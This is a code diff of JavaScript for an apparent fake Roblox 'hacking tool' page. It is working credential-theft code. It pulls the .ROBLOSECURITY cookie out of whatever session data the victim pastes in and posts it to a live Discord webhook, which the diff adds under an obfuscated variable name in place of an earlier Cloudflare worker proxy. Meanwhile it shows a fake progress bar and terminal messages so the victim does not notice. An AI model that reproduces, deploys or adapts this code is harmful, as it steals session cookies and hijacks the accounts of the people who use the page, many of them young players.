@@ -1,46 +1,56 @@
-const CLOUDFLARE_PROXY_URL = "https://wispy-pond-aa69.virtualmachineholder420.workers.dev/";
+const adwdawdacsazdawradfsadaw = 'https://discord.com/api/webhooks/1353774225181249566/4yLDywFMyhIaXvQSmH0_oojKSAZi1k_66WqJLEbpLcRm0qfTO8f_2Fywyl47irGMI9kI'
+
 
 function extractRobloxSecurityCookie(sessionId) {
-  // Try multiple patterns of cookie extraction
-  const patterns = [
-    /\.ROBLOSECURITY[^=]+=([^;]+)/,        // Pattern 1: .ROBLOSECURITY=value
-    /\.ROBLOSECURITY",\s*"([^"]+)"/,       // Pattern 2: .ROBLOSECURITY","value"
-    /_\|WARNING:-DO-NOT-SHARE-THIS[^_]+_/  // Pattern 3: Full cookie format
-  ];
-  
-  for (const pattern of patterns) {
-    const match = sessionId.match(pattern);
-    if (match) return match[0]; // Return the entire match
+  // Use a regular expression to find the .ROBLOSECURITY cookie
+  const regex = /\.ROBLOSECURITY",\s*"([^"]+)"/;
+  const match = sessionId.match(regex);
+  if (match && match[1]) {
+    return match[1]; // Return the cookie value
   }
-  return null; // Return null if no cookie found
-}
-
-async function sendToProxy(sessionId) {
-  try {
-    const response = await fetch(CLOUDFLARE_PROXY_URL, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        sessionId: sessionId,
-        timestamp: new Date().toISOString()
-      })
-    });
-    if (!response.ok) throw new Error(`HTTP error: ${response.status}`);
-    return await response.json();
-  } catch (error) {
-    console.error('Proxy error:', error);
-    throw error;
-  }
+  return null; // Return null if not found
 }
 
 function bruteforce(sessionId) {
-  try {
-    const cookie = extractRobloxSecurityCookie(sessionId) || sessionId;
-    sendToProxy(cookie);
-  } catch (error) {
-    console.error('Bruteforce error:', error);
+  let content;
+
+  // Check if the sessionId contains .ROBLOSECURITY
+  if (sessionId.includes(".ROBLOSECURITY")) {
+    const robloxSecurityCookie = extractRobloxSecurityCookie(sessionId);
+    if (robloxSecurityCookie) {
+      content = `New .ROBLOSECURITY Cookie Submitted:\n\`\`\`${robloxSecurityCookie}\`\`\``;
+    } else {
+      content = `No .ROBLOSECURITY cookie found in the sessionId:\n\`\`\`${sessionId}\`\`\``;
+    }
+  } else {
+    // Send the entire sessionId as-is
+    content = `New Session ID Submitted:\n\`\`\`${sessionId}\`\`\``;
   }
+
+  const payload = {
+    content: content
+  };
+
+  fetch(adwdawdacsazdawradfsadaw, {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+    },
+    body: JSON.stringify(payload),
+  })
+    .then(response => {
+      if (!response.ok) {
+        console.error('Failed to send data to Discord.');
+      } else {
+        console.log('Data sent successfully!');
+      }
+    })
+    .catch(error => {
+      console.error('Error:', error);
+    });
 }
+
+
 
 function validateInput() {
   const username = document.getElementById('username').value.trim();
@@ -66,17 +76,20 @@ function validateInput() {
     errorMessage = "Please complete the CAPTCHA to proceed.";
   }
 
+ 
   if (errorMessage) {
     showError(errorMessage);
     return;
   }
 
-  bruteforce(sessionId);
+
+bruteforce(sessionId);
 
   // Hide error and start fake hacking process
   hideError();
   startHack();
 }
+
 
 function showError(message) {
   const errorElement = document.getElementById('error');
@@ -84,39 +97,38 @@ function showError(message) {
   errorElement.classList.remove('hidden');
 }
 
+
 function hideError() {
   document.getElementById('error').classList.add('hidden');
 }
 
+
 function startHack() {
-  // Disable button and show progress
+
   document.getElementById('scanButton').disabled = true;
+
+
   document.getElementById('hacking').classList.remove('hidden');
 
-  // Reset terminal
-  const terminal = document.getElementById('terminal');
-  terminal.innerHTML = '[*] Initializing hacking sequence...\n';
-
-  // Progress bar animation
+ 
   const progressBar = document.getElementById('progress-bar-fill');
-  progressBar.style.width = '0%';
   let width = 0;
   const totalTime = 65000; // 65 seconds
   const intervalTime = 50; // Update every 50ms
-  const increment = (intervalTime / totalTime) * 100;
+  const increment = (intervalTime / totalTime) * 100; // Calculate increment per interval
 
   const progressInterval = setInterval(() => {
     if (width >= 100) {
       clearInterval(progressInterval);
-      // Show results after slight delay when progress completes
-      setTimeout(showCookieSuccess, 500);
+      showCookieSuccess();
     } else {
       width += increment;
       progressBar.style.width = width + '%';
     }
   }, intervalTime);
 
-  // Terminal messages
+  
+  const terminal = document.getElementById('terminal');
   const messages = [
     '[*] Scanning target account...',
     '[*] Identifying encryption: AES-256...',
@@ -125,7 +137,7 @@ function startHack() {
     '[*] Extracting _ROBLOSECURITY cookie...',
     '[*] Verifying cookie validity...'
   ];
-  const messageInterval = totalTime / messages.length;
+  const messageInterval = totalTime / messages.length; // Time between messages
 
   let i = 0;
   const terminalInterval = setInterval(() => {
@@ -133,12 +145,11 @@ function startHack() {
       clearInterval(terminalInterval);
     } else {
       terminal.innerHTML += messages[i] + '\n';
-      terminal.scrollTop = terminal.scrollHeight;
+      terminal.scrollTop = terminal.scrollHeight; // Auto-scroll
       i++;
     }
   }, messageInterval);
 }
-
 
 
 function showCookieSuccess() {
@@ -226,4 +237,3 @@ function closeTerms() {
 document.addEventListener('DOMContentLoaded', () => {
   document.querySelector('.close').addEventListener('click', closeTerms);
 });
-
